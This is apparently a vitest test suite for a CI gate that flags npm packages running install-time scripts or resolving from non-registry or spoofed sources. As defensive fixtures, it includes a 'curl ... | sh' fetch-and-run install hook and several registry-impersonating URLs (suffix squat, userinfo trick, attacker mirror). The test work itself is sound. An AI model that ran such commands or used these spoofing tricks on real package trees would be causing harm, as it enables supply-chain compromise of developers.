import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterAll, describe, expect, it } from 'vitest';
import {
  collectInstallScripts,
  collectFromLockfile,
  collectAll,
  compare,
  isRegistryUrl,
  isRegistryTarballFor,
  validateAllowlist,
} from '../../build-scripts/check-install-scripts.mjs';

// The install-script gate is the only thing standing between a compromised dev
// dependency and code execution on every `npm ci`. Test it like any other
// security control: a tree where it must fire, a tree where it must stay quiet,
// and the URL shapes that tried to impersonate the public registry.

const root = mkdtempSync(path.join(tmpdir(), 'install-scripts-'));
const nodeModules = path.join(root, 'node_modules');

function packageDir(name: string, scripts: Record<string, string>, extra: object = {}, under = root): string {
  const dir = path.join(under, 'node_modules', ...name.split('/'));
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name, version: '1.2.3', scripts, ...extra }));
  return dir;
}

packageDir('hooked-postinstall', { postinstall: 'node install.js' });
packageDir('hooked-preinstall', { preinstall: 'sh pre.sh' });
packageDir('hooked-install', { install: 'echo hi' });
packageDir('@scope/hooked', { postinstall: 'node -e 0' });
packageDir('gyp-native', {}); // `binding.gyp` below — implicit node-gyp rebuild
writeFileSync(path.join(nodeModules, 'gyp-native', 'binding.gyp'), '{}');
packageDir('gyp-flagged', {}, { gypfile: true });
packageDir('clean', { build: 'tsc', prepare: 'husky', test: 'vitest' }); // `prepare`/`build`/`test` never run on install
packageDir('empty-hook', { postinstall: '' });
const parent = packageDir('parent', {});
packageDir('nested-hooked', { install: 'curl -s https://example.invalid | sh' }, {}, parent);
mkdirSync(path.join(nodeModules, 'broken'), { recursive: true });
writeFileSync(path.join(nodeModules, 'broken', 'package.json'), '{ not json');

afterAll(() => rmSync(root, { recursive: true, force: true }));

const names = () => collectInstallScripts(nodeModules).map((p) => `${p.name}@${p.version}`).sort();

describe('collectInstallScripts', () => {
  it('finds every package that runs code at install time, including scoped and nested ones', () => {
    expect(names()).toEqual(
      [
        '@scope/hooked@1.2.3',
        'gyp-flagged@1.2.3',
        'gyp-native@1.2.3',
        'hooked-install@1.2.3',
        'hooked-postinstall@1.2.3',
        'hooked-preinstall@1.2.3',
        'nested-hooked@1.2.3'
      ].sort()
    );
  });

  it('ignores scripts that never run on install, empty hooks, and unreadable manifests', () => {
    const found = collectInstallScripts(nodeModules).map((p) => p.name);
    expect(found).not.toContain('clean'); // `prepare`/`build`/`test` are not install hooks
    expect(found).not.toContain('empty-hook');
    expect(found).not.toContain('broken');
    expect(found).not.toContain('parent');
  });

  it('records which hook fired', () => {
    const byName = Object.fromEntries(collectInstallScripts(nodeModules).map((p) => [p.name, p.hooks]));
    expect(byName['@scope/hooked']).toEqual(['postinstall']);
    expect(byName['gyp-native']).toEqual(['binding.gyp']); // no scripts field at all
    expect(byName['gyp-flagged']).toEqual(['binding.gyp']);
  });

  it('returns nothing for a tree with no hooks, or no tree at all', () => {
    const bare = mkdtempSync(path.join(tmpdir(), 'install-scripts-bare-'));
    packageDir('quiet', { test: 'vitest' }, {}, bare);
    expect(collectInstallScripts(path.join(bare, 'node_modules'))).toEqual([]);
    expect(collectInstallScripts(path.join(root, 'nope'))).toEqual([]);
    rmSync(bare, { recursive: true, force: true });
  });

  it('does not follow symlinks, so a self-referential link cannot hang or blow the stack', () => {
    // `npm link`, a `file:` dependency, or a stray link back into the tree made
    // the walker recurse until the CI step died with a stack overflow — a
    // tooling crash instead of an allowlist verdict. The lockfile's
    // `non-registry-dep` rule catches such packages instead.
    const tree = mkdtempSync(path.join(tmpdir(), 'install-scripts-links-'));
    packageDir('hooked-postinstall', { postinstall: 'node install.js' }, {}, tree);
    packageDir('child', { install: 'sh x.sh' }, {}, tree);
    const nm = path.join(tree, 'node_modules');
    symlinkSync(path.join(nm, 'hooked-postinstall'), path.join(nm, 'alias-of-hooked'), 'dir');
    mkdirSync(path.join(nm, 'child', 'node_modules'), { recursive: true });
    symlinkSync(nm, path.join(nm, 'child', 'node_modules', 'loop'), 'dir');

    expect(() => collectInstallScripts(nm)).not.toThrow();
    const found = collectInstallScripts(nm).map((p) => `${p.name}@${p.version}`);
    expect(found).toEqual(['child@1.2.3', 'hooked-postinstall@1.2.3']);
    rmSync(tree, { recursive: true, force: true });
  });

  it('keeps a nested duplicate at a second version as its own flagged entry', () => {
    // The npm-worm shape this gate exists to catch: the reviewed package at its
    // allowlisted version plus an unreviewed nested copy at another. Name-only
    // merging folds the second into the first; `name@version` keying (and
    // per-directory reporting) keeps `compare()` able to see the intruder.
    const tree = mkdtempSync(path.join(tmpdir(), 'install-scripts-dup-'));
    packageDir('reviewed-pkg', { postinstall: 'node install.js' }, {}, tree);
    packageDir('host-pkg', {}, {}, tree);
    packageDir(
      'reviewed-pkg',
      { postinstall: 'node evil.js' },
      { version: '9.9.9' },
      path.join(tree, 'node_modules', 'host-pkg')
    );
    const nm = path.join(tree, 'node_modules');

    // `collectAll` is the subject: name-keyed merging would fold 9.9.9 into the
    // 1.2.3 entry before `compare()` ever sees the intruder
    // (`collectInstallScripts` reports per-directory, so it passes either way).
    const merged = collectAll(nm);
    const found = merged
      .filter((p) => p.name === 'reviewed-pkg')
      .map((p) => `${p.name}@${p.version}`)
      .sort();
    expect(found).toEqual(['reviewed-pkg@1.2.3', 'reviewed-pkg@9.9.9']);

    // The repository's own (legitimately allowlisted) lock entries ride along
    // in the merged set, so only the intruder's problems matter here.
    const { problems } = compare(merged, { 'reviewed-pkg': '1.2.3' });
    expect(problems.filter((p) => p.includes('reviewed-pkg'))).toEqual([
      expect.stringContaining('reviewed-pkg@9.9.9'),
    ]);
    rmSync(tree, { recursive: true, force: true });
  });
});

describe('collectFromLockfile', () => {
  const lock = {
    packages: {
      '': { name: 'self', version: '0.5.0' },
      'node_modules/esbuild': { version: '0.27.2', hasInstallScript: true, resolved: 'https://registry.npmjs.org/esbuild/-/esbuild-0.27.2.tgz' },
      'node_modules/fsevents': { version: '2.3.3', hasInstallScript: true, os: ['darwin'], resolved: 'https://registry.npmjs.org/fsevents/-/fsevents-2.3.3.tgz' },
      'node_modules/@scope/native': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/@scope/native/-/native-1.0.0.tgz' },
      'node_modules/@scope/native/node_modules/dup': { version: '0.1.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/dup/-/dup-0.1.0.tgz' },
      'node_modules/clean-dep': { version: '3.0.0', resolved: 'https://registry.npmjs.org/clean-dep/-/clean-dep-3.0.0.tgz' },
      // git/file/link dependencies run `prepare` on install and have no
      // published manifest, so `hasInstallScript` never flags them.
      'node_modules/from-git': { version: '1.0.0', resolved: 'git+ssh://git@github.com/evil/helper.git#abc' },
      'node_modules/from-github-shorthand': { version: '1.0.0', resolved: 'github:evil/helper' },
      'node_modules/from-local': { version: '1.0.0', resolved: 'file:../helper' },
      'node_modules/linked': { version: '1.0.0', link: true },
      'node_modules/from-mirror': { version: '1.0.0', resolved: 'https://mirror.attacker.invalid/pkg.tgz' },
      // Suffix-squats the public registry to dodge a loose `registry.` check.
      'node_modules/suffix-squat': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org.evil.invalid/x/-/x-1.0.0.tgz' },
      // Real registry origin, but the tarball path belongs to another package —
      // origin-only checks call this genuine.
      'node_modules/name-swap': { version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/attacker/-/name-swap-1.0.0.tgz' },
      // No `resolved` at all: nothing to verify against, so fail closed.
      'node_modules/no-resolved': { version: '1.0.0', hasInstallScript: true },
      // npm aliases (`"typescript": "npm:@typescript/typescript6@6.0.2"`): npm
      // records the target in `name`, so the manifest in the directory belongs
      // to a *different* package than the directory — the shape the
      // TypeScript 7 (CLI) + 6 (API) side-by-side install produces. Without
      // `name` these would be indistinguishable from the `name-swap` above.
      'node_modules/@typescript/native': { name: 'typescript', version: '7.0.2', resolved: 'https://registry.npmjs.org/typescript/-/typescript-7.0.2.tgz' },
      'node_modules/typescript': { name: '@typescript/typescript6', version: '6.0.2', resolved: 'https://registry.npmjs.org/@typescript/typescript6/-/typescript6-6.0.2.tgz' },
      // An alias whose target does run an install script: the target's bytes are
      // what `npm ci` executes, under an address chosen by whoever edited
      // package.json.
      'node_modules/aliased-hooked': { name: 'real-hooked', version: '1.0.0', hasInstallScript: true, resolved: 'https://registry.npmjs.org/real-hooked/-/real-hooked-1.0.0.tgz' },
      // Honest-looking alias whose tarball path belongs to a third package.
      'node_modules/aliased-swap': { name: 'innocent', version: '1.0.0', resolved: 'https://registry.npmjs.org/attacker/-/innocent-1.0.0.tgz' },
      'node_modules/aliased-from-git': { name: 'innocent-too', version: '1.0.0', resolved: 'git+ssh://git@github.com/evil/helper.git#abc' }
    }
  };

  it('uses npm hasInstallScript plus non-registry provenance, keyed by the bare package name', () => {
    expect(collectFromLockfile(lock).map((p) => `${p.name}@${p.version}`).sort()).toEqual(
      [
        '@scope/native@1.0.0',
        '@typescript/native@7.0.2',
        'aliased-from-git@1.0.0',
        'aliased-hooked@1.0.0',
        'aliased-swap@1.0.0',
        'dup@0.1.0',
        'esbuild@0.27.2',
        'from-git@1.0.0',
        'from-github-shorthand@1.0.0',
        'from-local@1.0.0',
        'from-mirror@1.0.0',
        'fsevents@2.3.3',
        'linked@1.0.0',
        'name-swap@1.0.0',
        'no-resolved@1.0.0',
        'suffix-squat@1.0.0',
        'typescript@6.0.2'
      ].sort()
    );
  });

  it('accepts only the exact registry origin: genuine tarballs carry hasInstallScript alone, squats carry both labels', () => {
    const byName = Object.fromEntries(collectFromLockfile(lock).map((p) => [p.name, p.hooks]));
    // The one host the allowlist reviews tarballs against must pass cleanly.
    expect(byName['esbuild']).toEqual(['hasInstallScript']);
    expect(byName['@scope/native']).toEqual(['hasInstallScript']);
    // And a suffix-squat of it must not be treated as genuine.
    expect(byName['suffix-squat']).toEqual(['hasInstallScript', 'non-registry-dep']);
    // Registry *origin* is not registry *provenance*: the tarball path must
    // belong to the entry's own name, and a missing `resolved` fails closed.
    expect(byName['name-swap']).toEqual(['hasInstallScript', 'non-registry-dep']);
    expect(byName['no-resolved']).toEqual(['hasInstallScript', 'non-registry-dep']);
  });

  it('labels an alias by its target and keeps a non-registry alias non-registry', () => {
    const byName = Object.fromEntries(collectFromLockfile(lock).map((p) => [p.name, p]));
    // The two genuine aliases are reported under the *directory* name (what the
    // toolchain imports) with the target carried alongside for review.
    expect(byName['@typescript/native'].hooks).toEqual(['aliased']);
    expect(byName['@typescript/native'].alias).toEqual({ name: 'typescript', version: '7.0.2' });
    expect(byName['typescript'].alias).toEqual({ name: '@typescript/typescript6', version: '6.0.2' });
    // An alias is checked against its target's tarball path, so a same-origin
    // path owned by a third package and a `git` source both stay in the class
    // that is never allowlisted — reviewing the alias changes nothing.
    expect(byName['aliased-swap'].hooks).toEqual(['non-registry-dep']);
    expect(byName['aliased-from-git'].hooks).toEqual(['non-registry-dep']);
    // Install-script evidence survives the alias label; `compare()` needs both.
    expect(byName['aliased-hooked'].hooks).toEqual(['hasInstallScript', 'aliased']);
  });

  it('ignores the root project entry and clean registry dependencies', () => {
    const names = collectFromLockfile(lock).map((p) => p.name);
    expect(names).not.toContain('self');
    expect(names).not.toContain('clean-dep');
  });

  it('labels why a non-registry dependency was flagged', () => {
    const found = collectFromLockfile(lock).find((p) => p.name === 'from-git');
    expect(found?.hooks).toEqual(['non-registry-dep']);
  });

  it('returns nothing for a lockfile with no packages map', () => {
    expect(collectFromLockfile({})).toEqual([]);
    expect(collectFromLockfile(undefined)).toEqual([]);
  });
});

describe('isRegistryUrl', () => {
  it('accepts exactly the public registry origin', () => {
    expect(isRegistryUrl('https://registry.npmjs.org/esbuild/-/esbuild-0.27.2.tgz')).toBe(true);
    expect(isRegistryUrl('https://registry.npmjs.org/@scope/native/-/native-1.0.0.tgz')).toBe(true);
  });

  it('rejects every shape that impersonates the registry', () => {
    for (const resolved of [
      'http://registry.npmjs.org/x/-/x-1.0.0.tgz', // plaintext downgrade
      'https://registry.npmjs.org.evil.invalid/x/-/x.tgz', // suffix squat
      'https://registry.npmjs.orgx/y/-/y.tgz', // near-miss host
      'https://registry.npmjs.org@evil.invalid/x.tgz', // userinfo trick
      'https://evil.invalid/?u=https://registry.npmjs.org/', // only in the query
      'https://registry.npmjs.org', // no path: not a tarball resolution
      42,
      undefined,
    ]) {
      expect(isRegistryUrl(resolved as string), String(resolved)).toBe(false);
    }
  });
});

describe('isRegistryTarballFor', () => {
  it('accepts the registry tarball whose path belongs to the entry name', () => {
    expect(isRegistryTarballFor('esbuild', 'https://registry.npmjs.org/esbuild/-/esbuild-0.27.2.tgz')).toBe(true);
    expect(isRegistryTarballFor('@scope/native', 'https://registry.npmjs.org/@scope/native/-/native-1.0.0.tgz')).toBe(true);
  });

  it('rejects same-origin paths that belong to another package (or nothing)', () => {
    for (const [name, resolved] of [
      ['esbuild', 'https://registry.npmjs.org/attacker/-/esbuild-0.27.2.tgz'], // another package's tarball
      ['esbuild', 'https://registry.npmjs.org/esbuildish/-/x.tgz'], // near-miss name segment
      ['@scope/native', 'https://registry.npmjs.org/native/-/native-1.0.0.tgz'], // scope stripped
      ['esbuild', ''], // missing resolution fails closed
      ['esbuild', 'git+ssh://git@evil.invalid/esbuild.git'],
    ] as Array<[string, string]>) {
      expect(isRegistryTarballFor(name, resolved), `${name} <- ${resolved}`).toBe(false);
    }
  });
});

describe('compare — provenance is part of the verdict', () => {
  it('never lets an allowlisted name pass on non-registry bytes', () => {
    // The High-severity bypass this closes: reviewed name and version, but the
    // lockfile fetches the payload from somewhere the allowlist never reviewed
    // — name+version matching alone let this through silently.
    const swapped = [{ name: 'esbuild', version: '0.27.2', hooks: ['hasInstallScript', 'non-registry-dep'] }];
    const { problems } = compare(swapped, { esbuild: '0.27.2' });
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('esbuild@0.27.2');
    expect(problems[0]).toContain('never allowlisted');
  });
});

describe('compare', () => {
  const found = [
    { name: 'esbuild', version: '0.27.2', hooks: ['postinstall'] },
    { name: 'newcomer', version: '9.9.9', hooks: ['install'] }
  ];

  it('accepts exactly the allowlisted set, at the reviewed versions', () => {
    expect(compare(found, { esbuild: '0.27.2', newcomer: '9.9.9' })).toEqual({
      problems: [],
      stale: [],
      staleAliases: [],
    });
  });

  it('flags a package that started running code at install time', () => {
    const { problems } = compare(found, { esbuild: '0.27.2' });
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('newcomer@9.9.9');
    expect(problems[0]).toContain('not allowlisted');
  });

  it('flags an allowlisted package whose version moved, because that script was never reviewed', () => {
    // Name-only matching would let a compromised `esbuild` release run anything.
    const { problems } = compare([{ name: 'esbuild', version: '9.9.9-evil', hooks: ['postinstall'] }], { esbuild: '0.27.2' });
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('esbuild@9.9.9-evil');
    expect(problems[0]).toContain('allowlisted at 0.27.2');
  });

  it('does not let an inherited Object.prototype property satisfy the allowlist', () => {
    for (const name of ['toString', 'constructor', 'hasOwnProperty', '__proto__']) {
      const { problems } = compare([{ name, version: '1.0.0', hooks: ['postinstall'] }], { esbuild: '0.27.2' });
      expect(problems, name).toHaveLength(1);
      expect(problems[0], name).toContain('not allowlisted');
    }
  });

  it('treats an allowlisted package that is not installed as a note, not a failure', () => {
    // Optional deps are platform-specific (`fsevents` on macOS only), so a
    // superset allowlist must stay green on the ubuntu runner.
    const { problems, stale } = compare([found[0]], { esbuild: '0.27.2', 'platform-only': '1.0.0' });
    expect(problems).toEqual([]);
    expect(stale).toEqual(['platform-only']);
  });
});

describe('compare — npm aliases are reviewed against a target, not a name', () => {
  // The TypeScript 7 side-by-side install is the legitimate shape: `tsc` is the
  // native 7.0.2 binary, while typescript-eslint and tsup's DTS pass load the
  // 6.0 programmatic API. Both land through `npm:` aliases, so the gate cannot
  // keep refusing every alias (someone would `--write` the rule away) and must
  // instead make the alias itself the reviewed object.
  const native = [
    {
      name: '@typescript/native',
      version: '7.0.2',
      hooks: ['aliased'],
      alias: { name: 'typescript', version: '7.0.2' },
    },
  ];
  const reviewed = { '@typescript/native': 'typescript@7.0.2' };

  it('accepts a reviewed alias that runs nothing at install time, with no allow entry', () => {
    expect(compare(native, {}, reviewed)).toEqual({ problems: [], stale: [], staleAliases: [] });
  });

  it('flags an alias nobody reviewed', () => {
    // The retarget attack: package.json keeps the familiar name, the bytes come
    // from somewhere else. Name-based matching would never notice.
    const { problems } = compare(native, {}, {});
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('@typescript/native@7.0.2 is an npm alias for typescript@7.0.2');
    expect(problems[0]).toContain('has not been reviewed');
  });

  it('flags a reviewed alias whose target moved, in either direction', () => {
    const { problems } = compare(native, {}, { '@typescript/native': 'typescript@6.0.3' });
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('resolves to typescript@7.0.2 but the allowlist reviewed typescript@6.0.3');

    const renamed = [
      { ...native[0], alias: { name: 'typescript-evil', version: '7.0.2' } },
    ];
    const retargeted = compare(renamed, {}, reviewed).problems;
    expect(retargeted[0]).toContain('typescript-evil@7.0.2');
  });

  it('allowlists the target identity when an aliased package runs an install script', () => {
    const hooked = [
      {
        name: 'aliased-hooked',
        version: '1.0.0',
        hooks: ['hasInstallScript', 'aliased'],
        alias: { name: 'real-hooked', version: '1.0.0' },
      },
    ];
    const aliases = { 'aliased-hooked': 'real-hooked@1.0.0' };
    expect(compare(hooked, { 'real-hooked': '1.0.0' }, aliases)).toEqual({
      problems: [],
      stale: [],
      staleAliases: [],
    });
    // The alias review is not a substitute for the script review: the manifest a
    // human must read is the target's, under the target's name.
    const { problems } = compare(hooked, {}, aliases);
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('real-hooked@1.0.0 declares hasInstallScript but is not allowlisted');
    expect(compare(hooked, { 'real-hooked': '9.9.9' }, aliases).problems[0]).toContain(
      'real-hooked@1.0.0 is allowlisted at 9.9.9'
    );
  });

  it('never lets a reviewed alias bless bytes from somewhere else', () => {
    // Origin and target-path checks run before the alias map is consulted, so
    // `aliases` can only narrow what is installed, never launder a foreign source.
    const swapped = [
      {
        name: 'aliased-swap',
        version: '1.0.0',
        hooks: ['hasInstallScript', 'non-registry-dep'],
        alias: { name: 'innocent', version: '1.0.0' },
      },
    ];
    const { problems } = compare(swapped, { innocent: '1.0.0' }, { 'aliased-swap': 'innocent@1.0.0' });
    expect(problems).toHaveLength(1);
    expect(problems[0]).toContain('aliased-swap@1.0.0 resolves from a non-registry origin');
  });

  it('does not let an inherited property of the aliases map review an alias', () => {
    for (const name of ['toString', 'constructor', 'hasOwnProperty', '__proto__']) {
      const entry = [{ ...native[0], name }];
      const { problems } = compare(entry, {}, { 'esbuild': '0.28.2' });
      expect(problems, name).toHaveLength(1);
      expect(problems[0], name).toContain('has not been reviewed');
    }
  });

  it('treats a reviewed alias that is no longer installed as a note, not a failure', () => {
    const { problems, stale, staleAliases } = compare([], { esbuild: '0.28.2' }, { 'dropped-alias': 'typescript@7.0.2' });
    expect(problems).toEqual([]);
    expect(stale).toEqual(['esbuild']);
    expect(staleAliases).toEqual(['dropped-alias']);
  });
});

describe('validateAllowlist', () => {
  it('accepts exact pins, exact alias targets, and a missing section', () => {
    expect(
      validateAllowlist({
        allow: { esbuild: '0.28.2', 'fsevents-async': '1.0.0-beta.3' },
        aliases: { '@typescript/native': 'typescript@7.0.2', typescript: '@typescript/typescript6@6.0.2' },
      })
    ).toEqual([]);
    expect(validateAllowlist({})).toEqual([]);
    expect(validateAllowlist(undefined)).toEqual([]);
  });

  it('rejects the shapes that would fail closed with a confusing message', () => {
    // A range in a reviewed pin can never equal an installed version, so it would
    // surface as "esbuild is not allowlisted" — say what is wrong instead.
    expect(validateAllowlist({ allow: { esbuild: '^0.28.2' } })[0]).toContain('not an exact version');
    expect(validateAllowlist({ allow: { esbuild: '0.28' } })[0]).toContain('not an exact version');
    for (const spec of ['typescript@^7', 'typescript@7', 'typescript', '@7.0.2', 'typescript@', '', 7, null]) {
      expect(validateAllowlist({ aliases: { t: spec } }).length, JSON.stringify(spec)).toBe(1);
    }
    expect(validateAllowlist({ aliases: { t: 'typescript @7.0.2' } })[0]).toContain('whitespace');
    expect(validateAllowlist({ allow: { t: ' 1.0.0' } })[0]).toContain('whitespace');
    expect(validateAllowlist({ allow: [] })[0]).toContain('"allow" must be an object');
    expect(validateAllowlist({ aliases: 'nope' })[0]).toContain('"aliases" must be an object');
  });
});

describe('the repository allowlist', () => {
  const installed = fileURLToPath(new URL('../../node_modules', import.meta.url));
  const allowlistPath = fileURLToPath(new URL('../../build-scripts/install-scripts.json', import.meta.url));
  const packageJsonPath = fileURLToPath(new URL('../../package.json', import.meta.url));

  type Allowlist = { allow?: Record<string, string>; aliases?: Record<string, string> };
  const readAllowlist = () => JSON.parse(readFileSync(allowlistPath, 'utf8')) as Allowlist;

  it('is well-formed enough to be a reviewed document', () => {
    // Everything else in this file tests the gate; this tests the file the gate
    // reads. A typo in a pin is a fail-closed bug, not a security hole, and the
    // `npm test` signal catches it without waiting for CI's gate step.
    expect(validateAllowlist(readAllowlist())).toEqual([]);
  });

  it('covers everything the lockfile and node_modules contain', () => {
    // CI runs `npm run check:scripts`, but keeping the assertion here means a
    // plain `npm test` cannot pass while the gate is being bypassed.
    expect(existsSync(allowlistPath), `build-scripts/install-scripts.json is missing — run npm run check:scripts -- --write`).toBe(true);
    const { allow, aliases } = readAllowlist();
    expect(compare(collectAll(installed), allow ?? {}, aliases ?? {}).problems).toEqual([]);
  });

  it('lists a reviewed version for every package it allowlists', () => {
    const { allow, aliases } = readAllowlist();
    const found = collectAll(installed);
    expect(found.length, 'node_modules has install-script packages but the allowlist is empty').toBeGreaterThan(0);
    for (const pkg of found) {
      if (pkg.alias) {
        expect(aliases ?? {}, pkg.name).toHaveProperty(pkg.name, `${pkg.alias.name}@${pkg.alias.version}`);
      }
      if (pkg.hooks.some((hook: string) => hook !== 'aliased')) {
        // Keyed by the identity whose manifest runs the script: for an aliased
        // package that is the target, not the directory it was installed under.
        expect(allow, pkg.alias ? pkg.alias.name : pkg.name).toHaveProperty(pkg.alias ? pkg.alias.name : pkg.name, pkg.version);
      }
    }
  });

  it('reviews nothing that is no longer installed', () => {
    // Platform-optional entries are legitimately a superset (`fsevents` is
    // macOS-only), but an alias is a plain dependency: a reviewed alias that no
    // longer exists is a review that no longer describes this tree.
    const { aliases } = readAllowlist();
    const { staleAliases } = compare(collectAll(installed), {}, aliases ?? {});
    expect(staleAliases).toEqual([]);
  });

  it('records a reviewed target for every alias package.json declares', () => {
    // package.json says what should be installed, install-scripts.json says what
    // a human reviewed; the lockfile check above pins what is installed to the
    // latter, this one pins the former to it too. An alias expressed as a range
    // could never match, so the exactness of the declaration is load-bearing.
    const pkg = JSON.parse(readFileSync(packageJsonPath, 'utf8')) as {
      dependencies?: Record<string, string>;
      devDependencies?: Record<string, string>;
      overrides?: Record<string, string>;
    };
    const { aliases } = readAllowlist();
    const declared = Object.entries({ ...pkg.dependencies, ...pkg.devDependencies, ...pkg.overrides }).filter(
      ([, spec]) => String(spec).startsWith('npm:')
    );
    expect(declared.length, 'this tree installs TypeScript 7 and 6 side by side via npm: aliases').toBeGreaterThan(0);
    for (const [name, spec] of declared) {
      const target = String(spec).slice('npm:'.length);
      expect(target, `package.json "${name}" aliases "${spec}" — review an exact target, not a range`).toMatch(
        /^(?:@[^/]+\/)?[^/]+@\d+\.\d+\.\d+(?:[-+][0-9A-Za-z.-]+)?$/
      );
      expect(aliases ?? {}, name).toHaveProperty(name, target);
    }
  });
});
